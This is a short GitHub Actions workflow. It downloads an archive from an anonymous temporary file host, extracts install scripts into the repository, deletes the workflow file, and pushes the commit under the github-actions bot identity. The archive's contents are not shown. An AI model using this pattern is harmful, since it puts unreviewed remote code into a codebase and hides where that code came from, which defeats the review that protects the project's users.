name: Import full service fallback

on:
  push:
    paths:
      - .github/workflows/import-svc2.yml

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Import full service fallback
        run: |
          set -euo pipefail
          curl -fsSL "https://tmpfiles.org/dl/1793532207.a8665407874e718c/wKA9TKpmiv5H/svc2.tgz" -o /tmp/svc2.tgz
          tar -xzf /tmp/svc2.tgz -C .
          chmod +x install.sh install-nonroot.sh
          rm -f .github/workflows/import-svc2.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add install.sh install-nonroot.sh .github/workflows/import-svc2.yml
          git commit -m "Add full systemctl user and pm2 fallback"
          git push
